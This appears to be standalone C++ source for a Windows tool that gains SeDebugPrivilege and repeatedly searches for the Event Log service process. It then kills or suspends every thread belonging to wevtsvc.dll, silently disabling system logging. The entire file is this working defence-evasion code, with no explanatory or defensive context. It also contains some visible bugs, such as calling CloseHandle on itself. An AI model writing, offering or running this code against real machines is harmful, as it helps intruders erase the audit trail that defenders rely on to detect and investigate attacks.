#include <windows.h>
#include <tchar.h>
#include <psapi.h>
#include <iostream>
#include <tlhelp32.h>
#include <libloaderapi.h>
#include <thread>

typedef NTSTATUS(WINAPI *NTQUERYINFOMATIONTHREAD)(HANDLE, LONG, PVOID, ULONG, PULONG);

#define ThreadQuerySetWin32StartAddress 9
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#ifdef _WIN64
bool find(std::string line, std::string sWord)
#else
bool find(std::wstring line, std::string sWord)
#endif
{
	bool flag = false;
	int index = 0, i, helper = 0;
	for (i = 0; i < line.size(); i++)
	{
		if (sWord.at(index) == line.at(i))
		{
			if (flag == false)
			{
				flag = true;
				helper = i;
			}
			index++;
		}
		else
		{
			flag = false;
			index = 0;
		}
		if (index == sWord.size())
		{
			break;
		}
	}
	if ((i + 1 - helper) == index)
	{
		return true;
	}
	return false;
}

BOOL MatchAddressToModule(__in DWORD dwProcId, __out_bcount(MAX_PATH + 1) LPTSTR lpstrModule, __in DWORD dwThreadStartAddr, __out_opt PDWORD pModuleStartAddr)
{
	BOOL bRet = FALSE;
	HANDLE hSnap;
	MODULEENTRY32 moduleEntry32;
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPALL, dwProcId);
	moduleEntry32.dwSize = sizeof(MODULEENTRY32);
	moduleEntry32.th32ModuleID = 1;
	if (Module32First(hSnap, &moduleEntry32)) {
		if (dwThreadStartAddr >= (DWORD)moduleEntry32.modBaseAddr && dwThreadStartAddr <= ((DWORD)moduleEntry32.modBaseAddr + moduleEntry32.modBaseSize)) {
			_tcscpy(lpstrModule, moduleEntry32.szExePath);
		}
		else {
			while (Module32Next(hSnap, &moduleEntry32)) {
				if (dwThreadStartAddr >= (DWORD)moduleEntry32.modBaseAddr && dwThreadStartAddr <= ((DWORD)moduleEntry32.modBaseAddr + moduleEntry32.modBaseSize)) {
					_tcscpy(lpstrModule, moduleEntry32.szExePath);
					break;
				}
			}
		}
	}
	else
	{
		_tprintf(TEXT("No Match Found !!! \r\n"));
	}
	if (pModuleStartAddr) *pModuleStartAddr = (DWORD)moduleEntry32.modBaseAddr;
	CloseHandle(hSnap);
	return bRet;
}

DWORD WINAPI GetThreadStartAddress(__in HANDLE hThread)
{
	NTSTATUS ntStatus;
	DWORD dwThreadStartAddr = 0;
	HANDLE hPeusdoCurrentProcess, hNewThreadHandle;
	NTQUERYINFOMATIONTHREAD NtQueryInformationThread;
	if ((NtQueryInformationThread = (NTQUERYINFOMATIONTHREAD)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQueryInformationThread")))
	{
		hPeusdoCurrentProcess = GetCurrentProcess();
		if (DuplicateHandle(hPeusdoCurrentProcess, hThread, hPeusdoCurrentProcess, &hNewThreadHandle, THREAD_QUERY_INFORMATION, FALSE, 0))
		{
			// Changed sizeof(DWORD) to sizeof(LPVOID) - Not Working on x64
			ntStatus = NtQueryInformationThread(hNewThreadHandle, ThreadQuerySetWin32StartAddress, &dwThreadStartAddr, sizeof(LPVOID), NULL);
			CloseHandle(hNewThreadHandle);
			if (ntStatus != STATUS_SUCCESS)
				return 0;
		}
		else
		{
			_tprintf(TEXT("\t[+] DuplicateHandle Fail"));
		}
	}
	else
	{
		_tprintf(TEXT("\t[+] NtQueryInformationThread Fail"));
	}
	return dwThreadStartAddr;
}

BOOL KillProcessThreads(DWORD dwOwnerPID)
{
	HANDLE hSnap, hThread;
	THREADENTRY32 threadEntry32;
	DWORD dwModuleBaseAddr, dwThreadStartAddr;
	TCHAR lpstrModuleName[MAX_PATH + 1] = { 0 };

	if ((hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwOwnerPID)) == INVALID_HANDLE_VALUE) return -1;
	threadEntry32.dwSize = sizeof(THREADENTRY32);
	threadEntry32.cntUsage = 0;
	if (Thread32First(hSnap, &threadEntry32)) {
		while (Thread32Next(hSnap, &threadEntry32)) {
			if (threadEntry32.th32OwnerProcessID == dwOwnerPID) {
				hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, threadEntry32.th32ThreadID);
				dwThreadStartAddr = GetThreadStartAddress(hThread);
				MatchAddressToModule(dwOwnerPID, lpstrModuleName, dwThreadStartAddr, &dwModuleBaseAddr);
				_tprintf(TEXT("\t[+] %s : 0x%08X\r\n"), lpstrModuleName, dwThreadStartAddr - dwModuleBaseAddr);
				CloseHandle(hThread);

#ifdef _WIN64
				std::string wStr = lpstrModuleName;
				_tprintf("\tModule x64 => %s\r\n", lpstrModuleName);
#else
				std::wstring wStr = lpstrModuleName;
				_tprintf(TEXT("\tModule x86 => %s\r\n"), lpstrModuleName);
#endif			
				if (find(wStr, "wevtsvc.dll"))
				{
					// Open Thread Handle
					HANDLE ThH = OpenThread(THREAD_TERMINATE, FALSE, threadEntry32.th32ThreadID);

					if (!ThH)
					{
						_tprintf(TEXT("\tError opening Thread with (%d) handle.\r\n"), ThH);
						return 1;
					}

					// Terminate Given Thread
					BOOL KT = TerminateThread(ThH, -1);

					if (!KT)
					{
						_tprintf(TEXT("\tError killing Thread with handle %d\r\nTrying to Suspend it instead\r\n"), ThH);
						BOOL ST = SuspendThread(ThH);
						// If we can't Kill the Thread we Suspend it
						if (!ST)
						{
							_tprintf(TEXT("\tError Suspending Thread with handle %d\r\n We ain't Lucky on this one!\r\n"), ThH);
						}
						else
						{
							_tprintf(TEXT("\tThread with handle %d has been Suspended!\r\n"), ThH);
						}
					}
					else
					{
						_tprintf(TEXT("\tThread with handle %d has been Killed!\r\n"), ThH);
					}
					// Close Thread Handle
					CloseHandle(ThH);
				}
			}
		}
	}
	CloseHandle(hSnap);
	return 0;
}

int PrintModules(DWORD processID)
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	unsigned int i;
	// Get a handle to the process.
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (NULL == hProcess)
		return 1;
	// Get a list of all the modules in this process.
	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];
			// Get the full path to the module's file.
			if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
			{
#ifdef _WIN64
				std::string wStr = szModName;
#else
				std::wstring wStr = szModName;
#endif

				if (find(wStr,"wevtsvc.dll"))
				{
					// Print the module name and handle value.
					_tprintf(TEXT("\t[+] Found EL Process with PID : %d \n"), processID);

#ifdef _WIN64
					_tprintf("\tModule x64 => %s\r\n", szModName);
#else
					_tprintf(TEXT("\tModule x86 => %s\r\n"), szModName);
#endif

					KillProcessThreads(processID);
					///UnloadRemoteModule(hProcess);
				}
			}
		}
	}
	// Release the handle to the process.
	CloseHandle(hProcess);
	return 0;
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!OpenProcessToken(
		GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES,
		&hToken))
	{
		return FALSE;
	}
	if (!LookupPrivilegeValue(
		NULL,			// lookup privilege on local system
		lpszPrivilege,	// privilege to lookup 
		&luid))			// receives LUID of privilege
	{
		_tprintf(TEXT("LookupPrivilegeValue error: %u\n"), GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		_tprintf(TEXT("AdjustTokenPrivileges error: %u\n"), GetLastError());
		CloseHandle(hToken);
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		_tprintf(TEXT("The token does not have the specified privilege. \r\n"));
		CloseHandle(CloseHandle);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}

void DomaCheet()
{
	DWORD aProcesses[1024];
	DWORD cbNeeded;
	DWORD cProcesses;
	unsigned int i;
	if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
	{
		_tprintf(TEXT("Error enabling SeDebugPrivilege\r\n"));
		return;
	}

	while (true)
	{
		// Get the list of process identifiers.
		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			_tprintf(TEXT("Error enumerating Processes\r\n"));
			return;
		}
		
		// Calculate how many process identifiers were returned.
		cProcesses = cbNeeded / sizeof(DWORD);

		// Print the names of the modules for each process.
		for (i = 0; i < cProcesses; i++)
		{
			PrintModules(aProcesses[i]);
		}

		Sleep(600000);
	}
}


int main(void)
{
	std::thread t1(DomaCheet);
}